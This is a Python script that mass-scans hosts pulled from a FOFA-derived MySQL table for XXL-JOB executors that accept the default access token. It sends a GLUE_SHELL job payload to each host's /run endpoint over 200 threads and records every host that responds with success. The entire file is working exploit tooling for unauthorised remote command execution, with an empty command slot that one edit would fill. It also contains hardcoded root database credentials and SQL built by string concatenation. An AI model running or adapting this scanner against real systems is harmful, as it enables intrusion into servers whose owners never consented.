import http
import json
import logging
import os
from queue import Queue
from threading import Thread

import pymysql
import requests
logging.captureWarnings(True)

http.client.HTTPConnection._http_vsn_str = 'HTTP/1.1'

TABLENAME = "xxl_result"  # 存储扫描结果的表
DATATABLENAME = "fofadata"  # 存储数据来源的表
HOST = "127.0.0.1"
MYSQLPORT = 3306
MYSQLUSER = "root"
MYSQLPASSWORD = "root"
DATABASE = "fofa"  # 数据库
PAYLOAD = """{"jobId": 1,"executorHandler": "demoJobHandler","executorParams": "demoJobHandler","executorBlockStrategy": "COVER_EARLY","executorTimeout": 0,"logId": 1,"logDateTime": 1586629003729,"glueType": "GLUE_SHELL","glueSource": "","glueUpdatetime": 1586699003758,"broadcastIndex": 0,"broadcastTotal": 0}"""
HEADERS = {
        'Content-Type': 'application/json',
        'XXL-JOB-ACCESS-TOKEN': 'default_token',
        'Accept': 'text/html, image/gif, image/jpeg, *; q=.2, */*; q=.2',
        'Content-Length': '297',
        'Host':""
    }

def conn(ip, port, user, pwd, db):
    try:
        db = pymysql.connect(host=ip, port=port, user=user, password=pwd, database=db, connect_timeout=3)
        return [True, db]
    except Exception as e:
        return [False]
def getTarGet():
    global HOST, MYSQLPORT, MYSQLUSER, MYSQLPASSWORD, DATABASE, DATATABLENAME
    db = conn(HOST, MYSQLPORT, MYSQLUSER, MYSQLPASSWORD, DATABASE)
    if db[0]:
        database = db[1]
        cursor = database.cursor(pymysql.cursors.DictCursor)
        cursor.execute("select * from {};".format(DATATABLENAME))
        res = cursor.fetchall()
        cursor.close()
        database.close()
        return res
def init(tablename):
    global HOST, MYSQLPORT, MYSQLUSER, MYSQLPASSWORD, DATABASE
    db = conn(HOST, MYSQLPORT, MYSQLUSER, MYSQLPASSWORD, DATABASE)
    if db[0]:
        database = db[1]
        cursor = database.cursor(pymysql.cursors.DictCursor)
        cursor.execute(
            "create table if not exists " + tablename + "(id int auto_increment,ip varchar(100),port varchar(100),url varchar(100),primary key(id))charset=utf8;")
        database.commit()
        cursor.close()
        database.close()
def insert(tablename, url,ip,port):
    global HOST, MYSQLPORT, MYSQLUSER, MYSQLPASSWORD, DATABASE
    db = conn(HOST, MYSQLPORT, MYSQLUSER, MYSQLPASSWORD, DATABASE)
    if db[0]:
        database = db[1]
        cursor = database.cursor(pymysql.cursors.DictCursor)
        cursor.execute("select ip,port from {};".format(tablename))
        res = cursor.fetchall()
        b = True
        for i in res:
            if i['ip'] == ip and i['port'] == port:
                b = False
                break
        if b:
            cursor.execute(
                "insert into " + tablename + " (url,ip,port) VALUES ('{}','{}','{}')".format(url,ip,port))
            database.commit()
        cursor.close()
        database.close()


def poc(ip,port):
    url='http://'+ip+':'+str(port)+"/run"
    host = ip+":"+str("port")
    HEADERS['Host']=host
    try:
        r=requests.post(url,headers=HEADERS,data=PAYLOAD,timeout=3,verify=False)
        if r.status_code == 200:
            if json.loads(r.text).get("code")==200:

                with open("result.txt","a+",encoding='utf-8') as f:
                    f.write(url+"\n")
                    insert(TABLENAME,url,ip,port)
                print(url)
    except Exception as e:
        pass

class D(Thread):
    def __init__(self, q):
        super().__init__()
        self.q = q
    def run(self):
        while not self.q.empty():
            t=self.q.get()
            ip=t.split("::")[0]
            port=t.split("::")[1]
            poc(ip,port)
if __name__ == '__main__':
    if os.path.exists("success.txt"):
        os.remove('success.txt')
    ts = getTarGet()
    init(TABLENAME)
    q = Queue()
    for t in ts:
        ip = t['ip']
        port = t['port']
        q.put(ip+"::"+port)
    threads = []
    for i in range(200):
        threads.append(D(q))
    for t in threads:
        t.start()
    for t in threads:
        t.join()

